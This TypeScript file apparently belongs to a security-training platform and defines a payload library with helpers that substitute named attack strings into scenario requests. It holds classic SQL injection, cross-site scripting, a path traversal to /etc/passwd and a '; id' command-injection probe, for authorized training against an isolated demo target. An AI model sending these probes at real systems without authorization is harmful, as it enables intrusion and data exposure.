// Attack payload library.
//
// A payload is a named attack string that a scenario step can reference instead
// of hard-coding the raw string. This keeps scenarios readable ("payload":
// "sqlInjection") and gives the platform a single, reviewable place where the
// known attack strings live.
//
// These strings are intentionally benign classics used for *authorized*
// training against the user's own isolated demo target. They probe for a
// weakness; they do not, on their own, damage a well-built system.

export type PayloadName =
  | 'sqlInjection'
  | 'sqlInjectionUnion'
  | 'sqlInjectionComment'
  | 'xssPayload'
  | 'xssImg'
  | 'pathTraversal'
  | 'commandInjection';

export interface PayloadDefinition {
  /** The raw string substituted into the request. */
  value: string;
  /** High-level family, useful for reporting / OWASP mapping. */
  category: 'sqli' | 'xss' | 'path-traversal' | 'command-injection';
  /** Short human description shown in run logs. */
  description: string;
}

export const PAYLOADS: Record<PayloadName, PayloadDefinition> = {
  sqlInjection: {
    value: "' OR '1'='1",
    category: 'sqli',
    description: 'Classic boolean-based authentication bypass',
  },
  sqlInjectionUnion: {
    value: "' UNION SELECT NULL-- -",
    category: 'sqli',
    description: 'UNION-based column probe',
  },
  sqlInjectionComment: {
    value: "admin'-- -",
    category: 'sqli',
    description: 'Comment-out the rest of the query',
  },
  xssPayload: {
    value: '<script>alert(1)</script>',
    category: 'xss',
    description: 'Reflected/stored script injection',
  },
  xssImg: {
    value: '<img src=x onerror=alert(1)>',
    category: 'xss',
    description: 'Attribute-based XSS without <script>',
  },
  pathTraversal: {
    value: '../../../../etc/passwd',
    category: 'path-traversal',
    description: 'Directory traversal to a sensitive file',
  },
  commandInjection: {
    value: '; id',
    category: 'command-injection',
    description: 'Shell command chaining probe',
  },
};

export interface ResolvedPayload {
  value: string;
  /** True when `name` matched a known entry in the library. */
  known: boolean;
  definition?: PayloadDefinition;
}

/**
 * Resolve a step's `payload` field to a concrete string.
 *
 * - A known library name (e.g. "sqlInjection") resolves to its stored value.
 * - Any other non-empty string is treated as a literal, custom payload so
 *   authors are not limited to the built-in set.
 * - Undefined / empty input resolves to `undefined` (no payload for this step).
 */
export function resolvePayload(name?: string): ResolvedPayload | undefined {
  if (!name) return undefined;
  const def = (PAYLOADS as Record<string, PayloadDefinition>)[name];
  if (def) return { value: def.value, known: true, definition: def };
  return { value: name, known: false };
}

/** Placeholder token substituted with the resolved payload inside strings. */
export const PAYLOAD_TOKEN = '{{payload}}';

/**
 * Replace every occurrence of the payload token in `input` with `value`.
 * Non-string input is returned unchanged.
 */
export function applyPayloadToken<T>(input: T, value: string): T {
  if (typeof input !== 'string') return input;
  return input.split(PAYLOAD_TOKEN).join(value) as unknown as T;
}

export default PAYLOADS;
